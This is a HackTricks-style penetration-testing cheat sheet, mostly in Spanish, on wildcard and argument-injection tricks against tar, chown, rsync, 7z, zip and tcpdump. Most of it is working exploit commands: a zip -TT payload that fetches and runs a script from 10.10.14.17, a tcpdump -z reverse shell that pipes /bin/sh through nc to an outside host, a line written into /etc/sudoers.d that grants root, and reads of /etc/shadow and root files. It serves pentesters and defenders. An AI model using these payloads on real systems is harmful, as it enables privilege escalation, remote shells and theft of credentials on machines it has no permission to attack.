# Wildcards: Trucos adicionales

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin entrecomillar como `*`.
> Dado que la shell expande el wildcard **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede fabricar nombres de archivo que comiencen con `-` para que se interpreten como **opciones en lugar de datos**, contrabandeando efectivamente flags arbitrarios o incluso comandos.
> Esta página recopila las primitivas más útiles, investigaciones recientes y detecciones modernas para 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Cuando root más tarde ejecute algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Consulte también el documento clásico de DefenseCode para más detalles.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Ejecutar comandos arbitrarios abusando de la funcionalidad **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.

### bsdtar / macOS 14+

El `tar` por defecto en macOS recientes (basado en `libarchive`) *no* implementa `--checkpoint`, pero aún puedes conseguir ejecución de código con la flag **--use-compress-program**, que te permite especificar un compresor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.

---

## rsync

`rsync` te permite sobrescribir el shell remoto o incluso el binario remoto mediante opciones de línea de comandos que empiezan con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root más tarde archiva el directorio con `rsync -az * backup:/srv/`, la flag inyectada inicia tu shell en el lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Incluso cuando el script privilegiado *defensivamente* antepone el wildcard con `--` (para detener el análisis de opciones), el formato 7-Zip soporta **file list files** anteponiendo el nombre de archivo con `@`. Combinar eso con un symlink te permite *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y abortará, **imprimiendo el contenido en stderr**.

---

## zip

Existen dos primitivas muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).

- RCE vía test hook: `-T` habilita “test archive” y `-TT <cmd>` reemplaza al tester con un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que empiecen con `-`, divide las flags entre nombres de archivo distintos para que el parsing de short-options funcione:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NO intentes un único nombre de archivo como `'-T -TT <cmd>'` — las opciones cortas se analizan por carácter y fallará. Usa tokens separados como se muestra.
- Si las barras se eliminan de los nombres de archivo por la app, obtén desde un host/IP sin ruta (ruta por defecto `/index.html`) y guarda localmente con `-O`, luego ejecútalo.
- Puedes depurar el parsing con `-sc` (show processed argv) o `-h2` (more help) para entender cómo se consumen tus tokens.

Ejemplo (comportamiento local en zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Si la capa web refleja el stdout/stderr de `zip` (común con wrappers ingenuos), flags inyectadas como `--help` o fallos por opciones inválidas aparecerán en la respuesta HTTP, confirmando command-line injection y ayudando a afinar el payload.

---

## Binarios adicionales vulnerables a inyección por comodines (lista rápida 2023-2025)

Los siguientes comandos han sido abusados en CTFs modernos y en entornos reales. El payload siempre se crea como un *nombre de archivo* dentro de un directorio escribible que luego será procesado con un comodín:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Leer contenido del archivo |
| `flock` | `-c <cmd>` | Ejecutar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Ejecución de comandos vía git sobre SSH |
| `scp`   | `-S <cmd>` | Ejecutar un programa arbitrario en lugar de ssh |

Estas primitivas son menos comunes que los clásicos *tar/rsync/zip* pero vale la pena verificarlas al hacer hunting.

---

## tcpdump ganchos de rotación (-G/-W/-z): RCE vía argv injection en wrappers

Cuando un shell restringido o un vendor wrapper construye una línea de comando de `tcpdump` concatenando campos controlados por el usuario (p. ej., un parámetro "file name") sin un quoting/validación estrictos, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (límite de número de archivos) y `-z <cmd>` (comando post-rotate) permite la ejecución arbitraria de comandos como el usuario que ejecuta tcpdump (a menudo root en appliances).

Precondiciones:

- Puedes influir en `argv` pasado a `tcpdump` (p. ej., vía un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- El wrapper no sanitiza espacios ni tokens prefijados con `-` en el campo del nombre de archivo.

PoC clásico (ejecuta un reverse shell script desde una ruta escribible):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalles:

- `-G 1 -W 1` fuerza una rotación inmediata después del primer paquete coincidente.
- `-z <cmd>` ejecuta el comando post-rotate una vez por rotación. Muchas builds ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/intérprete, asegúrate de que el manejo de argumentos coincida con tu payload.

No-removable-media variants:

- Si tienes cualquier otro primitivo para escribir archivos (p. ej., un separate command wrapper que permita redirección de salida), coloca tu script en una ruta conocida y lanza `-z /bin/sh /path/script.sh` o `-z /path/script.sh` dependiendo de la semántica de la plataforma.
- Algunos vendor wrappers rotan a ubicaciones attacker-controllable. Si puedes influir en la ruta rotada (symlink/directory traversal), puedes dirigir `-z` para ejecutar contenido que controlas completamente sin external media.

---

## sudoers: tcpdump with wildcards/additional args → escritura/lectura arbitraria y root

Antipatrón muy común en sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemas
- El glob `*` y los patrones permisivos solo restringen el primer argumento `-w`. `tcpdump` acepta múltiples opciones `-w`; la última tiene efecto.
- La regla no fija otros parámetros, así que `-Z`, `-r`, `-V`, etc. están permitidos.

Primitivos
- Sobrescribir la ruta de destino con un segundo `-w` (el primero solo satisface sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro del primer `-w` para escapar del árbol restringido:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forzar la propiedad de salida con `-Z root` (crea archivos propiedad de root en cualquier lugar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Escritura de contenido arbitrario reproduciendo un PCAP creado a través de `-r` (p. ej., para añadir una línea en sudoers):

<details>
<summary>Crear un PCAP que contenga el payload ASCII exacto y escribirlo como root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lectura arbitraria de archivos/secret leak con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error a menudo imprimen líneas, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencias

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
